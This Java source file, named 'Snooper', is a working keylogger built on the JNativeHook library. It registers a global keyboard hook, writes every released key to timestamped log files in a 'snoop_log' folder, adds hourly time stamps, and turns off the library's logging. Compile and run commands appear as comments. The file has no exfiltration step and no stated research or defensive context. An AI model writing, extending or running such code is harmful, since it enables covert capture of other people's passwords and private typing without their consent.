import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyAdapter;

import java.util.logging.*;
import java.io.*;

//COMPILE: javac -cp ".;lib/jnativehook-2.1.0.jar;" Snooper.java
//RUN: java -cp ".;lib/jnativehook-2.1.0.jar;" Snooper

public class Snooper extends NativeKeyAdapter {
  
	public static final String FOLDER = "snoop_log";
	public static final String DASH = "/";
	public static final String START_NAME = "log_";
	public static final String EXTENSION_NAME = ".slog";
	public static final int SECOND_IN_MILLI = 1_000;
	public static final int HOUR_IN_MILLI = SECOND_IN_MILLI * 60 * 60;
	public static final String fileNameFormat = "yyyyMMddHHmmssSSSS";
	public static final String perHourFormat = "yyyy, MM dd, h:mma";

	private File folderFile;
	private File keyStrokesFile;
	private String keyStrokesFilePath;
	
	private String startDate;
	
	private javax.swing.Timer flushTimer;
	private javax.swing.Timer perHourTimer;
	
	private BufferedWriter bWriter;
	
	private boolean wroteSomething;
	
	public Snooper() {
		init();
	}
	
	public void init() {
		folderFile = new File(FOLDER);
		startDate = Util.getCurrentDate(fileNameFormat);
		keyStrokesFilePath = FOLDER + DASH + START_NAME + startDate + EXTENSION_NAME;
		keyStrokesFile = Util.createFile(keyStrokesFilePath);
		
		try {
			bWriter = new BufferedWriter(new FileWriter(keyStrokesFile));
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		
		Runtime.getRuntime().addShutdownHook(new Thread(()-> {
			try {
				if (bWriter != null) {
					bWriter.close();
				}
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}));
		
		flushTimer = new javax.swing.Timer(SECOND_IN_MILLI, e-> {
			try {
				if (wroteSomething) {
					wroteSomething = false;
					bWriter.flush();
				}
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		});
		
		perHourTimer = new javax.swing.Timer(HOUR_IN_MILLI, e-> {
			try {
				String hourlyUpdateString = "Hourly update as of: " + Util.getCurrentDate(perHourFormat);
				bWriter.write(hourlyUpdateString);
				bWriter.newLine();
				bWriter.flush(); 
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		});
		
		flushTimer.start();
		perHourTimer.setInitialDelay(0);
		perHourTimer.start();
	}
	
    public void nativeKeyReleased(NativeKeyEvent e) {
        try {
			if (bWriter == null) return;
			bWriter.write(NativeKeyEvent.getKeyText(e.getKeyCode()));
			bWriter.newLine();
			wroteSomething = true;
		} catch(Exception ex) {
			ex.printStackTrace();
		}
    }

    public static void main(String[] args) {
		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.OFF);
		logger.setUseParentHandlers(false);
        try {
            GlobalScreen.registerNativeHook();
        }
        catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());

            System.exit(1);
        }

        GlobalScreen.addNativeKeyListener(new Snooper());
    }
}